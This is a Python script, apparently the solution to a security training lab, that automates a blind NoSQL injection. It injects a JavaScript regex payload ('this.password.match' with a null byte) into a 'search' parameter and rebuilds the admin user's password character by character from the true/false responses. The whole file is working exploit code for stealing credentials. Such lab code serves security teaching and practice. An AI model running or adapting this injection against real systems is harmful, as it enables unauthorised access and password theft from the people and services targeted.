import argparse
import ast
import signal
import string
import sys
from bsqli import SqliHttpRequest
from bsqli import binary_search
from bsqli import linear_search

# goal of lab is to extract the password for the admin user
# vulnerable param: ?search=admin
# injection: %27%20%26%26%20this.password.match(/^{__GUESS_STRING__}*/)%00
# charset: [0-9a-f] + '-'
# truthy resonse: />admin</
extracted_password = []

def args():
  # configure arguments
  parser = argparse.ArgumentParser(description='Lab Blind NoSQL injection')
  parser.add_argument('-v', '--verbose', action='store_true')
  parser.add_argument('-t', '--target', help='target address', required=True)
  parser.add_argument('-c', '--cookies', help='cookies', required=False)
  arguments = parser.parse_args()
  return arguments.verbose, arguments.target, arguments.cookies

def prepare_lc_alphanumeric_hyphen_data():
  return list(map(str, range(0,10))) + list(string.ascii_lowercase) + list("-")

def interrupt_handler(signum, frame):
  print(f'Handling signal {signum} ({signal.Signals(signum).name}).')

  sys.exit(0)

def truthy_response(resp_data, value):
  return resp_data.find(bytes(value, 'utf-8')) != -1

def password_search_handler(val, op, pos):
  sql_passwd_inj = f"admin%27%26%26this.password.match(/^{''.join(extracted_password)}{val}/)%00"
  req.inject('param', 'search', sql_passwd_inj)
  resp = req.get()
  if resp.status_code != 200:
    print(f"HTTP Request failed with code {resp.status_code}")
    exit(1)

  return truthy_response(resp.content, '>admin<')

if __name__ == "__main__":
  signal.signal(signal.SIGINT, interrupt_handler)
  verbose, target, cookies = args()
  data = prepare_lc_alphanumeric_hyphen_data()

  if verbose:
    print(target)
    print(cookies)
    print(data)
  
  req = SqliHttpRequest(target)

  count = 0
  while True:
    password_char = linear_search(data, password_search_handler, 0)
    if password_char:
      extracted_password.append(password_char)
      count = count + 1
    else:
      break

    print('extracting password [%d]\r'%(int(count)), end="")
  
  print("\nPassword: {}".format("".join(extracted_password)), flush=True)
